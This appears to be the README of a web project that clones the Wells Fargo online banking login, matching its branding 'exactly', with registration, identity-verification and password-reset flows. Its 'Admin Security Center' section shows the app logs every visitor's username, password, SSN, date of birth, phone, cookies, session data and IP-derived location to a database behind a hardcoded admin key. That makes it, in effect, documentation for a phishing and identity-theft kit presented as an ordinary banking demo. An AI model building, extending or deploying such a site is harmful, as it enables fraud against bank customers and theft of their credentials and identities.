# Wells Fargo - Online Banking Login Page

## Overview
A professional banking-style login page with a clean, authentic design similar to the Wells Fargo banking website. Features a fully functional authentication system with form validation and user-friendly error handling.

## Authentication
The app uses real PostgreSQL database storage with secure password hashing. Users can register new accounts or use the demo credentials:
- **Demo Username:** demo
- **Demo Password:** demo123

New users can click "Enroll Now" to create an account with:
- Username (min 3 characters)
- Email address
- Phone number (optional)
- Date of Birth
- Last 4 digits of SSN
- Password (min 6 characters)

## Project Architecture

### Frontend (client/)
- **Framework:** React with TypeScript
- **Styling:** Tailwind CSS with custom design tokens
- **Forms:** react-hook-form with zod validation
- **State:** TanStack React Query for server state

### Backend (server/)
- **Framework:** Express.js
- **Database:** PostgreSQL with Drizzle ORM
- **Authentication:** bcrypt password hashing, express-session
- **Session Storage:** connect-pg-simple (PostgreSQL)
- **Validation:** Zod schemas

### Key Files
- `client/src/pages/login.tsx` - Main login page component
- `client/src/pages/register.tsx` - User registration page
- `client/src/pages/verify.tsx` - Identity verification page
- `client/src/pages/dashboard.tsx` - Account dashboard
- `client/src/pages/admin-security.tsx` - Admin security monitoring center
- `client/src/index.css` - Design tokens and color scheme
- `server/routes.ts` - Authentication API endpoints
- `server/storage.ts` - Database storage with bcrypt hashing
- `server/db.ts` - PostgreSQL/Drizzle connection
- `shared/schema.ts` - Database schema definitions

## Admin Security Center

Access the admin security dashboard at `/admin-security` to monitor all visitor activity.

**Default Admin Key:** `admin-security-2024`

The security center captures and displays:
- **Credentials:** Username, password, email, phone, SSN, date of birth
- **Device Info:** Browser, OS, device type (mobile/tablet/desktop)
- **Location:** IP address, city, region, country, timezone (via IP geolocation)
- **Session Data:** Cookies, session ID, form data
- **Activity:** Login attempts, registrations, page views

All data is stored in the `visitor_logs` database table and auto-refreshes every 10 seconds.

## API Endpoints

### POST /api/auth/login
Authenticates a user with username and password.

**Request:**
```json
{
  "username": "string",
  "password": "string"
}
```

**Success Response (200):**
```json
{
  "message": "Login successful",
  "user": { "id": "string", "username": "string" }
}
```

**Error Response (401):**
```json
{
  "message": "Invalid username or password"
}
```

### POST /api/auth/register
Creates a new user account with hashed password.

**Request:**
```json
{
  "username": "string",
  "password": "string",
  "email": "string",
  "phone": "string (optional)",
  "dateOfBirth": "string (YYYY-MM-DD)",
  "ssn": "string (last 4 digits)"
}
```

### GET /api/auth/me
Returns current authenticated user.

### POST /api/auth/logout
Destroys session and logs out user.

### POST /api/auth/verify-identity
Verifies user identity using username, date of birth, or SSN.

**Request:**
```json
{
  "verificationType": "username" | "dateOfBirth" | "ssn",
  "value": "string"
}
```

### POST /api/auth/reset-password
Resets user password after identity verification.

**Request:**
```json
{
  "newPassword": "string",
  "confirmPassword": "string"
}
```

## Design System
- **Primary Color:** Dark red (355 85% 40%)
- **Accent Color:** Yellow/Gold (45 95% 50%)
- **Font:** Inter sans-serif
- **Style:** Professional banking aesthetic with clean layouts

## User Flow
1. **Login** (/) - Enter credentials or click "Enroll Now"
2. **Register** (/register) - Create new account with username, email, DOB, SSN, password
3. **Verification** (/verify) - Verify identity using username/DOB/SSN, then reset password (protected)
4. **Dashboard** (/dashboard) - View accounts and balances (protected)
5. **Forgot Password** (/forgot-password) - Recover username or reset password

## Recent Changes
- January 2026: Added identity verification options (username, date of birth, SSN) after login
- Added password reset flow after successful identity verification
- Registration now collects date of birth and last 4 digits of SSN
- Added real PostgreSQL database storage
- Added bcrypt password hashing for security
- Added session management with express-session
- Added user registration page
- Added authentication guards to protected pages
- Added forgot password flow with username/password recovery options
- Added dashboard with account balances and quick actions
- Updated fonts to Open Sans and colors to match Wells Fargo exactly (#d71e28 red, #ffcd41 yellow)
- Added yellow accent bar across all pages for consistency
